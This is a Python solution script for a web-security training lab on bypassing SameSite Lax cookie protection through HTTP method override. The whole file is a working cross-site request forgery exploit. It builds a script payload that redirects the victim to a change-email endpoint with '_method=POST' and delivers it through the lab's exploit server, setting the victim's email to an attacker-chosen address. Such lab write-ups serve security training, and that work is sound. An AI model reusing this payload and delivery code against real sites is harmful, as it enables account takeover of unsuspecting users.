##################################################################################################
#
# Author: Ahmed Elqalaawy (@elqal3awii)
#
# Date: 24/10/2023
#
# Lab: SameSite Lax bypass via method override
#
# Steps: 1. Make the request to change the email using the GET method and include an 
#           additional URL parameter to override the method
#        2. Deliver the exploit to the victim
#        3. The victim's email will be changed after they trigger the exploit
#
##################################################################################################


###########
# imports
###########
import requests
from colorama import Fore

#########
# Main
#########

# change this to your lab URL
lab_url = "https://0a8200d4032acdb180d24992007e007e.web-security-academy.net"

# change this to your exploit server URL
exploit_server_url = "https://exploit-0a3a006c0346cd62807c483d01580013.exploit-server.net"

# the header of your exploit sever response
exploit_server_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    
# the new email
# you can change this to what you want
new_email = "hacked@you.com"

# payload to change the victim's email
payload = f"""<script>
                location = "{lab_url}/my-account/change-email?email={new_email}&_method=POST"
            </script>"""

# data to send via POST
data = {
    "formAction": "DELIVER_TO_VICTIM",
    "urlIsHttps": "on",
    "responseFile": "/exploit",
    "responseHead": exploit_server_head,
    "responseBody": payload,
}

try:
    # deliver the exploit to the victim
    res = requests.post(exploit_server_url, data)

except:
    print(Fore.RED + "[!] Failed to deliver the exploit to the victim through exception")
    exit(1)

print(Fore.WHITE + "❯❯ Delivering the exploit to the victim.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "🗹 The victim's email will be changed after they trigger the exploit") 
print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")



